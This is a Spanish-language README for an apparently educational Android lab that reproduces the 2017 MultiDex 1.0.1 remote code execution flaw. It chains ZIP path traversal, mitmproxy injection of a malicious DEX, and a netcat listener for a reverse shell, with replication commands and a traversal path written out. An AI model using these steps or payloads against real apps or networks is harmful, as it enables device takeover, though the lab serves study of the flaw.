# RCE Lab - Vulnerabilidad MultiDex 2017

## ¿Qué es esta vulnerabilidad?

Esta vulnerabilidad fue descubierta por **NowSecure en 2017** y afecta aplicaciones Android que utilizan MultiDex 1.0.1. El ataque combina dos técnicas:

1. **Path Traversal**: Archivos ZIP maliciosos que pueden escribir archivos fuera del directorio esperado usando `../../../../`
2. **MultiDex Auto-loading**: MultiDex 1.0.1 carga automáticamente archivos DEX desde el directorio `secondary-dexes`

**Referencia original**: [NowSecure Blog - Android Multidex RCE](https://www.nowsecure.com/blog/2017/03/22/multidex-android-apps-remote-code-execution/)

## ¿Cómo funciona el ataque?

1. La aplicación descarga archivos ZIP de URLs remotas
2. Un proxy malicioso (mitmproxy) intercepta las descargas y reemplaza el ZIP con uno malicioso
3. El ZIP malicioso contiene un archivo DEX en una ruta con path traversal: `../../../../data/data/com.app.lab.rce/code_cache/secondary-dexes/classes2.zip`
4. MultiDex 1.0.1 detecta automáticamente el archivo DEX y lo carga
5. El código malicioso se ejecuta inmediatamente (static initializer)

## Implementación del Path Traversal

### **Path Traversal Real vs Simulado**

El `exploit_bundle.zip` contiene una entrada con path traversal real:

```
../../../../data/data/com.app.lab.rce/code_cache/secondary-dexes/com.app.lab.rce-classes2.zip
```

Sin embargo, esta implementación **simula el resultado del path traversal** en lugar de ejecutarlo
directamente:

#### **¿Por qué simular en lugar de usar path traversal real?**

1. **Seguridad del Sistema Host**: Path traversal real podría escribir fuera del sandbox de la app
2. **Compatibilidad**: Funciona en cualquier versión de Android sin depender de permisos específicos
3. **Confiabilidad**: Android moderno tiene protecciones contra path traversal
4. **Propósito Educativo**: El resultado final es idéntico - DEX malicioso cargado por MultiDex

#### **Flujo de la Implementación:**

```kotlin
// 1. Extrae ZIP en cacheDir (seguro)
File(cacheDir, entryName)

// 2. Detecta archivos classes2.zip  
if (entryName.contains("classes2.zip"))

// 3. Copia manualmente a secondary-dexes (simula path traversal)
file.copyTo(File(targetDir, "com.app.lab.rce-classes2.zip"))

// 4. MultiDex carga automáticamente → RCE
```

#### **Equivalencia Funcional:**

| Path Traversal Real                           | Implementación Simulada                              |
|-----------------------------------------------|------------------------------------------------------|
| ZIP escribe directamente en `secondary-dexes` | ZIP extrae en `cacheDir` → copia a `secondary-dexes` |
| Vulnerable a protecciones del OS              | Siempre funciona                                     |
| Riesgo para el sistema host                   | Seguro para demostraciones                           |
| **Resultado: DEX en secondary-dexes**         | **Resultado: DEX en secondary-dexes**                |

### **Valor Educativo**

Ambos enfoques demuestran el mismo concepto de seguridad:

- ✅ **Vector de ataque**: ZIP malicioso con contenido controlado por atacante
- ✅ **Vulnerabilidad**: MultiDex 1.0.1 carga automáticamente DEX desde `secondary-dexes`
- ✅ **Impacto**: Ejecución remota de código sin interacción del usuario
- ✅ **Mitigación**: Actualizar a versiones más recientes de MultiDex

## Requisitos

- Android SDK instalado
- Emulador Android (API 21+)
- Python 3 con mitmproxy: `pip install mitmproxy`
- ADB configurado

## Pasos para replicar

### 1. Construir el payload malicioso

```bash
./build_payload.sh
```

Esto crea `exploit_bundle.zip` con el DEX malicioso y path traversal.

### 2. Compilar e instalar la aplicación vulnerable

```bash
./gradlew assembleDebug
adb install -r app/build/outputs/apk/debug/app-debug.apk
```

### 3. Configurar el proxy malicioso

```bash
# Iniciar mitmproxy en background
mitmdump -s mitmproxy/inject_payload.py -p 8090 &

# Configurar proxy en el emulador
adb shell settings put global http_proxy 10.0.2.2:8090
```

### 4. Preparar listener para reverse shell

```bash
nc -l 4444 &
```

### 5. Ejecutar el ataque

```bash
# Lanzar la aplicación
adb shell am start -n com.app.lab.rce/.MainActivity

# Monitorear logs del exploit
adb logcat | grep -E "(RCE|AdUpdateService)"
```

## ¿Cómo saber si funcionó?

### Indicadores visuales:

- **UI de la app**: Cambia de "SECURE" (verde) a "COMPROMISED" (rojo)

### Verificación técnica:

```bash
# Verificar archivo de evidencia
adb shell run-as com.app.lab.rce cat files/pwned.txt

# Verificar conexiones del reverse shell
lsof -i :4444
```

### Logs esperados:

```
RCE: Static initializer executed
RCE: Evidence file created successfully
RCE: Constructor executed - launching reverse shell
AdUpdateService: RCE executed
```

## Componentes del exploit

- **`AdUpdateService.kt`**: Descarga ZIPs cada 15 segundos y extrae con path traversal
- **`RCEApplication.kt`**: Configuración MultiDex vulnerable
- **`Shell.java`**: Payload que crea archivo de evidencia y reverse shell
- **`inject_payload.py`**: Proxy que intercepta y reemplaza descargas
- **`build_payload.sh`**: Script que construye el ZIP malicioso

## Funcionamiento automático

Una vez iniciada, la aplicación:

- Descarga archivos cada 15 segundos automáticamente
- El proxy intercepta y sirve el payload malicioso
- El exploit se ejecuta automáticamente sin intervención del usuario
- Cada ejecución crea nuevas conexiones de reverse shell

## Limpieza

Para resetear y probar desde cero:

```bash
# Limpiar datos de la app
adb shell pm clear com.app.lab.rce

# Detener procesos
pkill -f mitmdump && pkill -f nc
```

---

**⚠️ Nota**: Este proyecto es solo para fines educativos y demostración de vulnerabilidades de seguridad. No usar para actividades maliciosas.
